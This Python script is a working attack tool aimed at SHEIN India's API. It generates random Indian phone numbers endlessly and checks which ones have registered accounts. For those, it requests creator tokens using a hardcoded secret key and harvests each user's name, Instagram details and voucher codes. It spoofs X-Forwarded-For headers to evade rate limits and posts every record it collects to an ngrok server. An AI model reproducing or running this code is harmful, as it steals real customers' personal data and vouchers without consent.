import requests
import random
import json
import re
import sys
import logging
import time
import os
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import Timeout, ConnectionError, HTTPError
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

logging.basicConfig(
    format="%(asctime)s - %(levelname)s - %(message)s", 
    level=logging.INFO, 
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)

SAVE_SERVER_URL = "https://phototactic-florida-lacunose.ngrok-free.dev/save_profile"
MAX_RETRY_SAVE = 3
SAVE_TIMEOUT = 10

SECRET_KEY = os.environ.get("SHEIN_SECRET_KEY", "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg")
PORT = int(os.getenv("PORT", 8080))

class HealthCheckHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot Running")

def run_health_check():
    """Render ke liye health check server start karta hai."""
    server = HTTPServer(('0.0.0.0', PORT), HealthCheckHandler)
    logger.info(f"Health check server started on port {PORT}")
    server.serve_forever()

class SheinCliFetcher:
    """A CLI utility to fetch SHEIN profile data, optimized for stability and speed."""
    
    def __init__(self):
        self.client_token_url = "https://api.sheinindia.in/uaas/jwt/token/client"
        self.account_check_url = "https://api.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8"
        self.creator_token_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token"
        self.profile_url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user"

        self.session = requests.Session()
        
        retry_strategy = Retry(
            total=3, 
            backoff_factor=0.5, 
            status_forcelist=[500, 502, 503, 504],
        )

        adapter = HTTPAdapter(
            pool_connections=50, 
            pool_maxsize=50,
            max_retries=retry_strategy
        )
        
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)

 
    def get_random_ip(self):
        """Generate random IP address for X-Forwarded-For header."""
        return ".".join(str(random.randint(0, 255)) for _ in range(4))

    def extract_access_token(self, token_data):
        """Extract access token from response."""
        if isinstance(token_data, dict):
            for key in ['access_token', 'accessToken']:
                if key in token_data: return token_data[key]
            if 'data' in token_data and isinstance(token_data['data'], dict):
                for key in ['access_token', 'accessToken']:
                    if key in token_data['data']: return token_data['data'][key]
        return None

    def get_client_token(self):
        """Get SHEIN client token."""
        headers = {
            'Client_type': 'Android/29', 'Accept': 'application/json', 'Client_version': '1.0.8',
            'User-Agent': 'Android', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
            'X-Tenant': 'B2C', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret"

        try:
            response = self.session.post(self.client_token_url, headers=headers, data=data, timeout=15)
            response.raise_for_status()
            return response.json()
        except Timeout:
            logger.error("Timeout getting client token.")
            return None
        except ConnectionError as e:
            logger.error(f"Connection error getting client token (after retries): {e}")
            return None
        except HTTPError as e:
            logger.error(f"HTTP error getting client token: {e}. Response status: {e.response.status_code}")
            return None
        except Exception as e:
            logger.error(f"Unknown error getting client token: {e}")
            return None

    def check_shein_account(self, client_token, phone_number):
        """Check SHEIN account and get encryptedId."""
        headers = {
            'Authorization': f'Bearer {client_token}', 'Requestid': 'account_check', 'X-Tenant': 'B2C',
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '968777a5-36e1-42a8-9aad-3dc36c3f77b2',
            'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'api.sheinindia.in',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = f'mobileNumber={phone_number}'
        try:
            response = self.session.post(self.account_check_url, headers=headers, data=data, timeout=10)
            response.raise_for_status()
            return response.json()
        except HTTPError as e:
            if e.response.status_code == 404:
                return None
            logger.warning(f"HTTP error checking account for {phone_number}: {e}. Status: {e.response.status_code}")
            return None
        except Timeout:
            logger.warning(f"Timeout checking account for {phone_number}.")
            return None
        except ConnectionError as e:
            logger.error(f"Connection error checking account for {phone_number} (after retries): {e}")
            return None
        except Exception as e:
            logger.error(f"Unknown error checking account for {phone_number}: {e}")
            return None

    def get_encrypted_id(self, phone_number):
        """Get encryptedId from SHEIN API."""
        try:
            client_token_data = self.get_client_token()
            client_token = self.extract_access_token(client_token_data)
            if not client_token: return None

            time.sleep(random.uniform(0.1, 0.3))

            account_data = self.check_shein_account(client_token, phone_number)

            if account_data and isinstance(account_data, dict):
                for container in [account_data, account_data.get('data'), account_data.get('result')]:
                    if isinstance(container, dict) and 'encryptedId' in container:
                        return container['encryptedId']
        except Exception as e:
            logger.error(f"Error in get_encrypted_id for {phone_number}: {e}")
        return None

    def get_creator_token(self, phone_number, encrypted_id, user_name="CLI_User"):
        """Get creator access token."""
        headers = {
            'Accept': 'application/json', 'User-Agent': 'Android', 'Client_type': 'Android/29',
            'Client_version': '1.0.8', 'X-Tenant-Id': 'SHEIN', 'Ad_id': '4d9bbb2c54af468f8130b96dac93362d',
            'Content-Type': 'application/json; charset=UTF-8', 'Host': 'shein-creator-backend-151437891745.asia-south1.run.app',
            'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip', 'X-Forwarded-For': self.get_random_ip()
        }
        data = {
            "client_type": "Android/29", "client_version": "1.0.8", "gender": "male",
            "phone_number": phone_number,
            "secret_key": SECRET_KEY,
            "user_id": encrypted_id, "user_name": user_name
        }
        try:
            response = self.session.post(self.creator_token_url, json=data, headers=headers, timeout=10)
            response.raise_for_status()
            result = response.json()
            return self.extract_access_token(result)
        except Timeout:
            logger.error(f"Timeout getting creator token for {phone_number}.")
            return None
        except ConnectionError as e:
            logger.error(f"Connection error getting creator token for {phone_number} (after retries): {e}")
            return None
        except HTTPError as e:
            logger.error(f"HTTP error getting creator token for {phone_number}: {e}. Status: {e.response.status_code}")
            return None
        except Exception as e:
            logger.error(f"Unknown error getting creator token for {phone_number}: {e}")
            return None

    def get_user_profile(self, access_token):
        """Get user profile with voucher data."""
        headers = {
            'content-type': 'application/json',
            'authorization': f'Bearer {access_token}',
            'X-Forwarded-For': self.get_random_ip()
        }
        try:
            response = self.session.get(self.profile_url, headers=headers, timeout=10)
            response.raise_for_status()
            return response.json()
        except Timeout:
            logger.warning("Timeout getting user profile.")
            return None
        except ConnectionError as e:
            logger.error(f"Connection error getting user profile (after retries): {e}")
            return None
        except HTTPError as e:
            logger.warning(f"HTTP error getting user profile: {e}. Status: {e.response.status_code}")
            return None
        except Exception as e:
            logger.warning(f"Unknown error getting user profile: {e}")
            return None

    def _safe_get_value(self, data_dict, keys, default='N/A'):
        """Safely retrieve value."""
        for key in keys:
            value = data_dict.get(key)
            if value is not None and value != '':
                try:
                    if isinstance(value, (int, float)):
                        return str(int(value))
                    return str(value)
                except:
                    pass
        for key in keys:
            value = data_dict.get(key)
            if value == 0 or value == '0':
                return '0'
        return default

    def format_profile_response(self, profile_data, phone_number):
        """Format profile response for CLI output and structured saving."""
        try:
            if not profile_data:
                return f"❌ No profile data received for phone: {phone_number}", None, None

            user_data = profile_data.get('user_data', {}) or {}
            user_name = self._safe_get_value(user_data, ['user_name'], default='N/A')
            instagram_data = user_data.get('instagram_data', {}) or {}
            username = self._safe_get_value(instagram_data, ['username', 'user_name'], default='N/A')
            followers_count = self._safe_get_value(instagram_data, ['followers_count', 'follower_count'], default='0')
            voucher_data = user_data.get('voucher_data', {}) or {}
            voucher_code = self._safe_get_value(voucher_data, ['voucher_code'], default='N/A')
            voucher_amount = self._safe_get_value(voucher_data, ['voucher_amount'], default='0')

            # Structured data for saving
            structured_data = {
                "phone_number": phone_number,
                "name": user_name,
                "insta_user": username,
                "insta_followers": followers_count,
                "voucher_code": voucher_code,
                "voucher_amount_rs": voucher_amount,
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
            }

            response = f"""
✅ PROFILE FOUND!
  • Phone: {phone_number}
  • Name: {user_name}
  • Insta User: {username}
  • Insta Followers: {followers_count}

🎫 Voucher:
  • Code: {voucher_code}
  • Amount: ₹{voucher_amount}"""

            return response, profile_data, structured_data

        except Exception as e:
            logger.error(f"Error formatting profile: {e}")
            return f"❌ Error formatting profile data. Check logs.", None, None

    def generate_indian_numbers(self, count):
        """Generate a list of random 10-digit Indian mobile numbers starting with 6, 7, 8, or 9."""
        numbers = []
        valid_starters = ['6', '7', '8', '9']
        
        for _ in range(count):
            first_digit = random.choice(valid_starters)
            remaining_digits = ''.join(random.choices('0123456789', k=9))
            number = first_digit + remaining_digits
            numbers.append(number)
        return numbers

    def process_single_number(self, phone_number):
        """Main logic for a single phone number check."""
        phone_number = ''.join(filter(str.isdigit, phone_number))

        if len(phone_number) != 10:
            logger.error(f"Invalid length: {phone_number}")
            return None

        # Step 1: Get encryptedId
        encrypted_id = self.get_encrypted_id(phone_number)

        if not encrypted_id:
            logger.warning(f"❌ Not Registered: {phone_number}")
            return None

        # Step 2: Get creator token
        creator_token = self.get_creator_token(phone_number, encrypted_id)
        time.sleep(random.uniform(0.5, 1.0))

        if not creator_token:
            return None

        # Step 3: Get user profile with voucher data
        profile_data = self.get_user_profile(creator_token)

        if profile_data:
            return phone_number, profile_data
        else:
            return None

# --- REMOTE SAVE FUNCTION ---
def save_profile_remotely(profile_data):
    """Save profile data to remote server via ngrok."""
    if not SAVE_SERVER_URL or SAVE_SERVER_URL == "http://your-ngrok-url.ngrok.io/save_profile":
        logger.error("⚠️  SAVE_SERVER_URL not configured! Profile will not be saved.")
        return False
    
    for attempt in range(MAX_RETRY_SAVE):
        try:
            response = requests.post(
                SAVE_SERVER_URL,
                json=profile_data,
                timeout=SAVE_TIMEOUT
            )
            
            if response.status_code == 200:
                logger.info(f"✅ Profile saved remotely for {profile_data.get('phone_number')}")
                return True
            else:
                logger.warning(f"Save server returned status {response.status_code}: {response.text}")
                
        except Exception as e:
            logger.warning(f"Attempt {attempt + 1} failed to save remotely: {e}")
            
        if attempt < MAX_RETRY_SAVE - 1:
            time.sleep(1)
    
    logger.error(f"❌ Failed to save profile for {profile_data.get('phone_number')} after {MAX_RETRY_SAVE} attempts")
    return False

# --- Main CLI Automation Logic ---
def main_cli_automation():
    """CLI Entry point for continuous concurrent automation."""
    
    if len(sys.argv) > 1:
        print("⚠️ Warning: Command line argument for test count is ignored for infinite mode.")
    
    # Check if save server URL is configured
    if SAVE_SERVER_URL == "http://your-ngrok-url.ngrok.io/save_profile":
        print("\n" + "!"*60)
        print("⚠️  WARNING: SAVE_SERVER_URL is not configured!")
        print("   Please update SAVE_SERVER_URL in the script with your ngrok URL")
        print("   Format: http://XXXX-XX-XX-XX-XX.ngrok.io/save_profile")
        print("!"*60 + "\n")
    
    fetcher = SheinCliFetcher()
    
    MAX_WORKERS = 12
    BATCH_SIZE = 1200
    
    total_checked = 0
    found_count = 0
    
    print("\n" + "#"*60)
    print(f"🚀 Starting CONTINUOUS test mode with {MAX_WORKERS} workers")
    print(f"   Batch Size: {BATCH_SIZE} numbers per cycle")
    print(f"   Save Server: {SAVE_SERVER_URL}")
    print("   Press Ctrl+C to stop the process")
    print("#"*60 + "\n")
    
    try:
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            
            while True:
                numbers_to_test = fetcher.generate_indian_numbers(BATCH_SIZE)
                logger.info(f"--- Generated next batch of {BATCH_SIZE} numbers ---")
                
                results = executor.map(fetcher.process_single_number, numbers_to_test)
                
                for result in results:
                    total_checked += 1
                    
                    if result:
                        phone_number, profile_data = result
                        formatted_response, _, structured_data = fetcher.format_profile_response(profile_data, phone_number)
                        
                        if structured_data:
                            found_count += 1
                            
                            # Save remotely
                            save_success = save_profile_remotely(structured_data)
                            
                            print("\n" + "="*60)
                            print(f"🎉 FOUND PROFILE! (Total checked: {total_checked}, Found: {found_count})")
                            print(formatted_response)
                            print(f"💾 Save Status: {'✅ Remote' if save_success else '❌ Failed'}")
                            print("="*60 + "\n")
                
                time.sleep(random.uniform(2.0, 3.0))
                
    except KeyboardInterrupt:
        print("\n\n" + "🛑"*25)
        print("🛑 Script stopped by user")
        print(f"✅ Final Summary:")
        print(f"Total Numbers Checked: {total_checked}")
        print(f"Profiles Found: {found_count}")
        print("🛑"*25 + "\n")
    except Exception as e:
        logger.critical(f"A critical error occurred: {e}")

if __name__ == "__main__":
    health_thread = threading.Thread(target=run_health_check, daemon=True)
    health_thread.start()
    try:
        main_cli_automation()
    except Exception as e:
        logger.critical(f"Main loop crashed: {e}")